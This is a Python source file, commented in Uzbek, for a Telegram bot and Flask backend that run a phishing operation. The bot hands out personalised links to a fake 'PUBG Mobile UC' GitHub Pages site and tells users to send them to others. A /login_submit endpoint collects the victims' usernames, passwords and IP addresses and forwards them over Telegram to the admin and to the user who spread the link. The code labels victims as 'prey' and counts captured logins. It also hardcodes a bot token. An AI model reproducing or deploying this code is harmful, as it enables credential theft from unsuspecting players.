import logging
import asyncio
import threading
import pytz
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask, request, jsonify
from flask_cors import CORS  # <-- MUHIM: Boshqa saytdan ma'lumot olish uchun

# --- SOZLAMALAR ---
TOKEN = "7712836266:AAFLRtTf67NHkeoQh9AXfNscJvgReBL2XEU"
ADMIN_ID = 8250478755  # O'z ID raqamingiz
CHANNEL_USERNAME = "@abdurazoqov606"
CREATOR_USERNAME = "@abdurozoqov_edits"

# Render sizga bergan manzil (Masalan: https://bot-nomi.onrender.com)
# Buni aniq yozishingiz shart, aks holda GitHub sayt ishlamaydi!
RENDER_BACKEND_URL = "https://pubgku.onrender.com" 

# Sizning GitHub Sayt Linki (Oxiri / bilan tugasin)
GITHUB_SITE_URL = "https://pubgmobile-uc.github.io/versiya-/"

# --- STATISTIKA ---
stats = {
    "users": set(),
    "links_given": 0,
    "logins_captured": 0
}

# --- FLASK SERVER ---
app = Flask(__name__)
CORS(app) # <-- MUHIM: GitHub saytidan ma'lumot qabul qilishga ruxsat beradi

@app.route('/')
def home():
    return "Bot Serveri Ishlamoqda (Backend)!"

# Ma'lumot qabul qilish qismi
@app.route('/login_submit', methods=['POST'])
def login_submit():
    try:
        data = request.json
        stats['logins_captured'] += 1
        
        user_id = data.get('user_id')
        method = data.get('method')
        username = data.get('username')
        password = data.get('password')
        ip = data.get('ip')
        
        msg = (
            f"🔥 <b>YANGI O'LJA (GitHubdan)!</b>\n\n"
            f"📥 <b>Kirish:</b> {method.upper()}\n"
            f"👤 <b>Login:</b> <code>{username}</code>\n"
            f"🔑 <b>Parol:</b> <code>{password}</code>\n"
            f"🌍 <b>IP:</b> {ip}\n"
            f"🆔 <b>User ID:</b> {user_id}"
        )

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        # Adminga yuborish
        try:
            loop.run_until_complete(bot.send_message(ADMIN_ID, f"👑 <b>Admin uchun:</b>\n{msg}", parse_mode="HTML"))
        except: pass

        # Userga (o'ziga) yuborish
        if user_id and str(user_id).isdigit():
            try:
                loop.run_until_complete(bot.send_message(int(user_id), f"✅ <b>Sizning ma'lumotingiz:</b>\n{msg}", parse_mode="HTML"))
            except: pass

        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

def run_flask():
    app.run(host="0.0.0.0", port=5000)

# --- BOT QISMI ---
bot = Bot(token=TOKEN)
dp = Dispatcher()

async def daily_report_task():
    while True:
        tz = pytz.timezone('Asia/Tashkent')
        now = datetime.now(tz)
        if now.hour == 8 and now.minute == 0:
            report = (
                f"📊 <b>KUNLIK HISOBOT:</b>\n"
                f"👥 Odamlar: {len(stats['users'])}\n"
                f"🔗 Linklar: {stats['links_given']}\n"
                f"🎣 Loginlar: {stats['logins_captured']}"
            )
            try: await bot.send_message(ADMIN_ID, report, parse_mode="HTML")
            except: pass
            await asyncio.sleep(65)
        await asyncio.sleep(30)

async def check_sub(user_id):
    try:
        m = await bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return m.status in ['creator', 'administrator', 'member']
    except: return False

@dp.message(F.text == "/start")
async def start_cmd(msg: types.Message):
    uid = msg.from_user.id
    stats['users'].add(uid)
    if await check_sub(uid):
        await give_link(msg)
    else:
        await msg.answer(
            f"👋 Salom! Botdan foydalanish uchun kanalga a'zo bo'ling:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="📢 A'zo bo'lish", url=f"https://t.me/{CHANNEL_USERNAME.replace('@','')}")],
                [InlineKeyboardButton(text="✅ Tekshirish", callback_data="check")]
            ])
        )

@dp.callback_query(F.data == "check")
async def check_btn(call: types.CallbackQuery):
    if await check_sub(call.from_user.id):
        await call.message.delete()
        await give_link(call.message)
    else:
        await call.answer("❌ Kanalga a'zo bo'lmadingiz!", show_alert=True)

async def give_link(message: types.Message):
    stats['links_given'] += 1
    # GITHUB LINKI + USER ID
    # Natija: https://pubgmobile-uc.github.io/versiya-/?user_id=12345678
    link = f"{GITHUB_SITE_URL}?user_id={message.chat.id}"
    
    await message.answer(
        f"✅ <b>Link tayyor!</b>\n\n"
        f"🔗 <b>Maxsus havola:</b>\n{link}\n\n"
        f"<i>Kimgadir tashlang, u kirib login qilsa, ma'lumot sizga keladi!</i>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🚀 LINKNI OCHISH", url=link)]
        ]),
        parse_mode="HTML"
    )

async def main():
    threading.Thread(target=run_flask).start()
    asyncio.create_task(daily_report_task())
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
